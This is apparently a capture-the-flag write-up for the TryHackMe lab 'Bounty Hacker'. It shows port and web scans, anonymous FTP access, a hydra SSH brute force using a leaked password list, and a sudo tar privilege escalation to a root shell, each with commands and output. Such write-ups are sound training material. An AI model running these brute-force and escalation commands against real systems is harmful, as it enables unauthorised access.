# Bounty Hacker @TryHackMe

Difficulty: EASY

Keywords and tools: nmap, dirb, nikto, ftp, google, ssh, bruteforce

Questions:

1.Who wrote the task list? 

2.What service can you bruteforce with the text file found?

3.What is the users password? 

4.user.txt

5.root.txt

### Ping the target to see it's alive (target IP will be given after you've joined the room)
```
ping 10.10.180.213
PING 10.10.180.213 (10.10.180.213) 56(84) bytes of data.
64 bytes from 10.10.180.213: icmp_seq=1 ttl=63 time=50.4 ms
64 bytes from 10.10.180.213: icmp_seq=2 ttl=63 time=53.2 ms
```

### nmap scan
``` 
nmap -sV -n -v -Pn -p- -T4 -A 10.10.180.213
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```
Found open ports 21, 22 and 80. So FTP, SSH and web application.

Note the "Anonymous FTP login allowed"

### Lets run dirb and nikto scans
```
dirb http://10.10.180.213
---- Scanning URL: http://10.10.180.213/ ----
==> DIRECTORY: http://10.10.180.213/images/                                                                      
+ http://10.10.180.213/index.html (CODE:200|SIZE:969)                                                            
+ http://10.10.180.213/server-status (CODE:403|SIZE:278)       
```


```
nikto -h 10.10.180.213
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.180.213
+ Target Hostname:    10.10.180.213
+ Target Port:        80
+ Start Time:         2021-01-22 03:51:05 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 3c9, size: 5a789fef9846b, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-01-22 03:58:59 (GMT-5) (474 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nothing interesting found with dirb or nikto. Opening site with browser, nothing interesting.


### Lets checkout the FTP
```
ftp 10.10.180.213                  
Connected to 10.10.180.213.
220 (vsFTPd 3.0.3)
Name (10.10.180.213:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```
Lets read locks.txt and task.txt

```
1.) Protect Vicious. 
2.) Plan for Red Eye pickup on the moon.

-lin

-------------------------------------------

rEddrAGON 
ReDdr4g0nSynd!cat3 
Dr@gOn$yn9icat3 
R3DDr46ONSYndIC@Te 
ReddRA60N 
R3dDrag0nSynd1c4te 
dRa6oN5YNDiCATE 
ReDDR4g0n5ynDIc4te 
R3Dr4gOn2044 
RedDr4gonSynd1cat3 
R3dDRaG0Nsynd1c@T3 
Synd1c4teDr@g0n 
reddRAg0N 
REddRaG0N5yNdIc48e 
Dra6oN$yndIC@t3 
4L1mi6H71StHeB357 
rEDdragOn$ynd1c473 
DrAgoN5ynD1cATE 
ReDdrag0n$ynd1cate 
Dr@gOn$yND1C4Te 
RedDr@gonSyn9ic47e 
REd$yNdIc47e 
dr@goN5YNd1c@73 
```
Passwords apparently, but we found answer to our first question.
Who wrote the task list? lin

### Lets try bruteforcing SSH with the passwordlist and username lin.
```
hydra 10.10.180.213 -l lin -P locks.txt ssh 

ydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-22 04:07:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.180.213:22/
[22][ssh] host: 10.10.180.213   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```
Found login: lin   password: RedDr4gonSynd1cat3.

Also got the answer for the second and third questions: 

What service can you bruteforce with the text file found? SSH

What is the users password? RedDr4gonSynd1cat3


### Lets SSH with the found credentials.
```
ssh lin@10.10.180.213 

lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
```
Here's our answer to fourth question. user.txt: 

Lets see list of allowed commands.
```
lin@bountyhacker:/$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
We can run tar as root. Quick google "root tar sudo exploit" or similiar should point you to https://gtfobins.github.io/gtfobins/tar/.

```
lin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# 
# whoami
root
# locate root.txt
/root/root.txt
# cat /root/root.txt

```
And here we have our final answer. THM***********}




